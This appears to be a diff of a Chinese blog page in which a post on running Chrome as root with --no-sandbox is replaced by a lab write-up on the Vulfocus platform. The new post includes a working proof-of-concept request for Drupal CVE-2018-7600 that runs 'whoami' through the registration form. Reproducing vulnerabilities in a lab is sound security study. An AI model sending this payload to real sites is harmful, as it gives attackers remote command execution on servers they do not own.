@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Root用户下运行Google Chrome, 小晨曦 小晨曦的博客">
+    <meta name="keywords" content="Vulfocus,漏洞复现,POC,Drupal远程代码执行漏洞,CVE-2018-7600,汉化,Burp Suite v2020.2.1">
     <meta name="description" content="小晨曦的博客">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>Root用户下运行Google Chrome | 小晨曦</title>
+    <title>vulfocus通过 | 小晨曦</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -213,12 +213,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/xcxmiku/xcxmiku.github.io/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Root用户下运行Google Chrome</h1>
+                    <h1 class="description center-align post-title">vulfocus通过</h1>
                 </div>
             </div>
         </div>
@@ -347,8 +347,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/" class="post-category">
-                                技术分享
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
                             </a>
                         
                     </div>
@@ -360,21 +360,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-06
+                    2020-04-22
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-03-06
+                    2020-04-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    142
+                    286
                 </div>
                 
 
@@ -396,16 +396,27 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/linux/sandboxing.md" target="_blank" rel="noopener">chromium的沙盒机制(sandbox)</a>无法在root用户下运行</p>
-<p><img src="https://i.loli.net/2020/03/06/JcavdFy9s1DZx3I.png" alt=""></p>
-<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>在命令行下输入如下代码即可启动</p>
-<pre><code>google-chrome --no-sandbox</code></pre><p>如需通过桌面图标启动，请修改/usr/share/applications/google-chrome.desktop文件</p>
-<pre><code>Exec=/usr/bin/google-chrome-stable %U</code></pre><p>改为</p>
-<pre><code>Exec=/usr/bin/google-chrome-stable --no-sandbox %U </code></pre><p>有三处，都添加–no-sandbox即可</p>
-<p><img src="https://i.loli.net/2020/03/06/HzcjWK4LXEqpumn.png" alt=""></p>
-<p><img src="https://i.loli.net/2020/03/06/5w182QBOUljTCvx.png" alt=""></p>
-<p><img src="https://i.loli.net/2020/03/06/5w182QBOUljTCvx.png" alt=""></p>
-<script>
+                <h1 id="Vulfocus"><a href="#Vulfocus" class="headerlink" title="Vulfocus"></a>Vulfocus</h1><h2 id="演示地址：http-vulfocus-fofa-so"><a href="#演示地址：http-vulfocus-fofa-so" class="headerlink" title="演示地址：http://vulfocus.fofa.so/"></a>演示地址：<a href="http://vulfocus.fofa.so/" target="_blank" rel="noopener">http://vulfocus.fofa.so/</a></h2><p>docker 仓库：<a href="https://hub.docker.com/u/vulfocus" target="_blank" rel="noopener">https://hub.docker.com/u/vulfocus</a></p>
+<p>源码：<a href="https://github.com/fofapro/vulfocus/" target="_blank" rel="noopener">https://github.com/fofapro/vulfocus/</a></p>
+<h2 id="Vulfocus的特性"><a href="#Vulfocus的特性" class="headerlink" title="Vulfocus的特性"></a>Vulfocus的特性</h2><ol>
+<li>启动：一键漏洞环境启动，方便简单。</li>
+<li>自带 Flag 功能：每次启动 flag 都会自动更新，明确漏洞是否利用成功。</li>
+<li>带有计分功能也可适用于相关安全人员能力的考核。</li>
+<li>兼容 <a href="https://vulhub.org/" target="_blank" rel="noopener">Vulhub</a>、<a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">Vulapps</a> 中所有漏洞镜像。</li>
+</ol>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h4 id="Drupal远程代码执行漏洞-CVE-2018-7600"><a href="#Drupal远程代码执行漏洞-CVE-2018-7600" class="headerlink" title="Drupal远程代码执行漏洞(CVE-2018-7600)"></a>Drupal远程代码执行漏洞(CVE-2018-7600)</h4><p>POC</p>
+<pre><code>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1
+Host: ip:port
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=whoami</code></pre><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -448,7 +459,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://xcxmiku.com/archives/2e214463/">http://xcxmiku.com/archives/2e214463/</a>
+                    <a href="http://xcxmiku.com/archives/41783/">http://xcxmiku.com/archives/41783/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -551,51 +562,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/archives/991371b6/">
+                <a href="/archives/41783/">
                     <div class="card-image">
                         
+                        <img src="https://cdn.jsdelivr.net/gh/xcxmiku/xcxmiku.github.io/medias/featureimages/21.jpg" class="responsive-img" alt="vulfocus通过">
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="第一笔加密货币(ETH)交易">
-                        
-                        <span class="card-title">第一笔加密货币(ETH)交易</span>
+                        <span class="card-title">vulfocus通过</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            交易记录
-用于购买Porkbun的域名
-
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.d
+                            Vulfocus演示地址：http://vulfocus.fofa.so/docker 仓库：https://hub.docker.com/u/vulfocus
+源码：https://github.com/fofapro/vulfocus/
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81/" class="post-category">
-                                    加密货币
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81/">
-                        <span class="chip bg-color">加密货币</span>
+                    <a href="/tags/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/">
+                        <span class="chip bg-color">技术分享</span>
                     </a>
                     
                 </div>
@@ -609,34 +617,30 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/archives/a1f6425f/">
+                <a href="/archives/57083/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/xcxmiku/xcxmiku.github.io/medias/featureimages/22.jpg" class="responsive-img" alt="VPS的配置与优化">
+                        <img src="https://cdn.jsdelivr.net/gh/xcxmiku/xcxmiku.github.io/medias/featureimages/16.jpg" class="responsive-img" alt="CVE-2020-0796本地提权">
                         
-                        <span class="card-title">VPS的配置与优化</span>
+                        <span class="card-title">CVE-2020-0796本地提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            因为某些原因重装了VPS，简单记录下重装后的配置。
-连接推荐一个颜值很高且多终端同步的SSH客户端Termius
-
-vps上重装的系统是Ubuntu 18.04 LTS Server - 64 Bit 
-配置与优化更新源和软件apt upd
+                            CVE-2020-0796漏洞概述CVE-2020-0796 | Windows SMBv3 客户端/服务器远程代码执行漏洞Microsoft 服务器消息块 3.1.1 (SMBv3) 协议处理某些请求的方式中存在远程执行代码漏洞。成功利用
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-31
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/" class="post-category">
-                                    技术分享
+                            <a href="/categories/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/" class="post-category">
+                                    资源分享
                                 </a>
                             
                             
@@ -646,8 +650,12 @@ vps上重装的系统是Ubuntu 18.04 LTS Server - 64 Bit
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Linux/">
-                        <span class="chip bg-color">Linux</span>
+                    <a href="/tags/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/">
+                        <span class="chip bg-color">资源分享</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
